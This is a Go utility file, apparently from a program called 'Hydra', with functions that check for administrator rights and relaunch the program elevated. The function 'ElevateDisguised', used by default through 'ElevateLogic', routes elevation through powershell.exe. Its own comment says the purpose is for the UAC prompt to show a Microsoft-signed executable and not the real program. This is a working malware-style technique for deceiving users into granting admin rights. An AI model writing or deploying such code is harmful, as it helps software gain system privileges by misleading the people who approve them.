package util

import (
	"errors"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
)

const (
	runasCmd = "Start-Process \"%s\" -Verb runas -Arg 'chill'"
)

// RunningAsAdmin returns whether the current process has administrative privileges.
func RunningAsAdmin() bool {
	return runningAsAdmin()
}

// IsUserAdmin checks if the current user is an administrator.
// If the process is impersonating a user, it will return that value.
func IsUserAdmin() bool {
	u, err := user.Current()
	Handle(err)
	ids, err := u.GroupIds()
	Handle(err)
	for _, id := range ids {
		if id == "S-1-5-32-544" {
			return true
		}
	}
	return false
}

// IsWritable return whether a path or a file is writable.
func IsWritable(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}

	var fn string
	var f *os.File
	if info.IsDir() {
		fn = filepath.Join(path, "check")
		f, err = os.Create(fn)
		f.Close()
		os.Remove(fn)
	} else {
		fn = path
		f, err = os.Open(fn)
		f.Close()
	}

	if err != nil {
		return false
	}

	return true
}

// RunAsAdmin attempts to execute a command with admin rights.
func RunAsAdmin(command, arguments string) error {
	chk := runAsAdmin(command, arguments)
	return chk
}

// ElevateNormal attempts to relaunch Hydra with admin rights.
// It displays a common UAC prompt to the user, with the name of the executable.
func ElevateNormal() error {
	chk := elevateNormal()
	return chk
}

// ElevateDisguised attempts to relaunch Hydra with admin rights.
// It displays a common UAC prompt to the user, containing the details of an
// executable signed by Microsoft, namely powershell.exe.
func ElevateDisguised() error {
	exe, _ := os.Executable()
	args := fmt.Sprintf(runasCmd, exe)
	if err := RunAsAdmin("powershell", args); err != nil {
		return err
	}
	os.Exit(0)
	//oh, hi there
	return nil
}

func ElevateLogic() error {
	if RunningAsAdmin() {
		return nil
	}
	if !IsUserAdmin() {
		return errors.New("This user does not have admin rights")
	}
	return ElevateDisguised()
}
